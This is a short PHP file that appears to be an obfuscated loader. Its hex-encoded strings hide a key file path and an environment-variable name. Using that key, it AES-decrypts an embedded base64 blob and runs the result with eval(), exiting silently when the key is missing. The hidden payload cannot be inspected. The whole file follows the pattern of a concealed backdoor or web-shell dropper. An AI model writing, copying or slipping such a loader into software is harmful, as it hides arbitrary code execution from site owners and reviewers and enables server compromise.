<?php
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');
$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);
if(!$k)exit;
$i=base64_decode('AXiUh5vG1kfN8NGrzo7aBA==');
$c=base64_decode(
'qIO5LbyDdOhXv4upmAkOjHQBNoDzOgNbmxWew30oF4bMOarF8BlKH+UzhTGSMYdJVdbJp+07Tgbn' .
'SBzP2kB/cF31KyqxfSRn5Y3jQW6xXkR08zbzOjHUu0BHrxZFcnhkiZ797sPueSgJrtA+VOd0ImW3' .
'B4uI9erjTUlt9+Aal9W+O14T/AdMS3QbskUvNzKkSPh+4JpWDyXe+vkrVlxjfJqvnVWjIo4ajGrA' .
'jSfDoF77LS5Wc4wuiCoSUxyScCVJgQki8bGUbNF0ZJPeILiH+fpQ2Tq38peB5RPthqPwOr4aRvQM' .
'pH/QOz+16e0d/7BsfZQFrRWpD9M6FJ0PvQUU/0V8Mdz88yzTcTPaHh5gOTtgaH8sU22MvbplY0BJ' .
'W073jqfVyFaC2OOfPFelCOWZbdJvgIU80RnQw5uTPtpyP/iTFViuq+06pA01uKxD0rgF'
);
$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);
if($d===false)exit;
eval($d);
